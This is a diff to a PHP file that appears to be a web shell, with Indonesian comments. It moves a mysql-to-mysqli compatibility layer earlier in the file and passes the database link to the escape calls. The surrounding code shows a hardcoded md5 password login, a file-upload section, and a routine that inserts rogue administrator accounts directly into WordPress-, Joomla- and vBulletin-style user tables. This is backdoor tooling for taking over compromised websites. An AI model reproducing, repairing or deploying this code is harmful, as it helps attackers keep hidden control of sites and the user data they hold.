@@ -11,6 +11,19 @@ if (!ini_get('date.timezone')) {
 session_start();
 $stored_password_hash = md5("password"); // ganti password
 
+// === MYSQL EXTENSION COMPAT LAYER (place early to avoid undefined function) ===
+if (!function_exists('mysql_connect')) {
+    function mysql_connect($host, $user, $pass) { return @mysqli_connect($host, $user, $pass); }
+    function mysql_select_db($dbname, $link=null) { return @mysqli_select_db($link, $dbname); }
+    function mysql_query($query, $link=null) { return @mysqli_query($link, $query); }
+    function mysql_real_escape_string($str, $link=null) { return $link ? mysqli_real_escape_string($link, $str) : addslashes($str); }
+    function mysql_fetch_assoc($result) { return @mysqli_fetch_assoc($result); }
+    function mysql_fetch_row($result) { return @mysqli_fetch_row($result); }
+    function mysql_num_rows($result) { return @mysqli_num_rows($result); }
+    function mysql_insert_id($link=null) { return @mysqli_insert_id($link); }
+    function mysql_close($link=null) { return @mysqli_close($link); }
+}
+
 // === LOGIN ===
 if (!isset($_SESSION['loggedin'])) {
     if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
@@ -250,10 +263,10 @@ if (isset($_POST['cms_add_admin']) && isset($_POST['cms_type'])) {
                 if ($hash === '') { // fallback md5
                     $hash = md5($admin_pass);
                 }
-                $au = mysql_real_escape_string($admin_user);
-                $ae = mysql_real_escape_string($admin_email);
-                $hp = mysql_real_escape_string($hash);
-                $disp = mysql_real_escape_string($admin_user);
+                $au = mysql_real_escape_string($admin_user, $link);
+                $ae = mysql_real_escape_string($admin_email, $link);
+                $hp = mysql_real_escape_string($hash, $link);
+                $disp = mysql_real_escape_string($admin_user, $link);
                 $exist = @mysql_query("SELECT ID FROM `".$users_table."` WHERE user_login='".$au."' LIMIT 1");
                 if ($exist && mysql_num_rows($exist) > 0) {
                     $row = mysql_fetch_assoc($exist);
@@ -286,11 +299,11 @@ if (isset($_POST['cms_add_admin']) && isset($_POST['cms_type'])) {
                     $salt = substr(md5(uniqid(mt_rand(), true)),0,16);
                     $hash = md5($admin_pass.$salt).':'.$salt;
                 }
-                $au = mysql_real_escape_string($admin_user);
-                $ae = mysql_real_escape_string($admin_email);
-                $hp = mysql_real_escape_string($hash);
-                $nm = mysql_real_escape_string($admin_user);
-                $now = mysql_real_escape_string(date('Y-m-d H:i:s'));
+                $au = mysql_real_escape_string($admin_user, $link);
+                $ae = mysql_real_escape_string($admin_email, $link);
+                $hp = mysql_real_escape_string($hash, $link);
+                $nm = mysql_real_escape_string($admin_user, $link);
+                $now = mysql_real_escape_string(date('Y-m-d H:i:s'), $link);
                 $exist = @mysql_query("SELECT id FROM `".$users_table."` WHERE username='".$au."' LIMIT 1");
                 if ($exist && mysql_num_rows($exist)>0) {
                     $row = mysql_fetch_assoc($exist); $uid=intval($row['id']);
@@ -310,12 +323,12 @@ if (isset($_POST['cms_add_admin']) && isset($_POST['cms_type'])) {
             } elseif ($cms_type === 'vbulletin') {
                 // Simplified vBulletin (may fail if schema differs)
                 $users_table = $prefix . 'user';
-                $au = mysql_real_escape_string($admin_user);
-                $ae = mysql_real_escape_string($admin_email);
+                $au = mysql_real_escape_string($admin_user, $link);
+                $ae = mysql_real_escape_string($admin_email, $link);
                 $salt = substr(md5(uniqid(mt_rand(), true)), 0, 30);
                 $hp = md5(md5($admin_pass).$salt);
-                $hp = mysql_real_escape_string($hp);
-                $salt = mysql_real_escape_string($salt);
+                $hp = mysql_real_escape_string($hp, $link);
+                $salt = mysql_real_escape_string($salt, $link);
                 $joindate = time();
                 $exist = @mysql_query("SELECT userid FROM `".$users_table."` WHERE username='".$au."' LIMIT 1");
                 if ($exist && mysql_num_rows($exist)>0) {
@@ -337,38 +350,6 @@ if (isset($_POST['cms_add_admin']) && isset($_POST['cms_type'])) {
     }
 }
 
-// === MYSQL EXTENSION COMPAT LAYER (fallback ke mysqli) ===
-if (!function_exists('mysql_connect')) {
-    function mysql_connect($host, $user, $pass) {
-        $link = @mysqli_connect($host, $user, $pass);
-        return $link;
-    }
-    function mysql_select_db($dbname, $link=null) {
-        return @mysqli_select_db($link, $dbname);
-    }
-    function mysql_query($query, $link=null) {
-        return @mysqli_query($link, $query);
-    }
-    function mysql_real_escape_string($str, $link=null) {
-        if ($link) return mysqli_real_escape_string($link, $str);
-        return addslashes($str);
-    }
-    function mysql_fetch_assoc($result) {
-        return @mysqli_fetch_assoc($result);
-    }
-    function mysql_fetch_row($result) {
-        return @mysqli_fetch_row($result);
-    }
-    function mysql_num_rows($result) {
-        return @mysqli_num_rows($result);
-    }
-    function mysql_insert_id($link=null) {
-        return @mysqli_insert_id($link);
-    }
-    function mysql_close($link=null) {
-        return @mysqli_close($link);
-    }
-}
 
 // === CREATE ===
 if (!empty($_FILES['file']['name'])) {
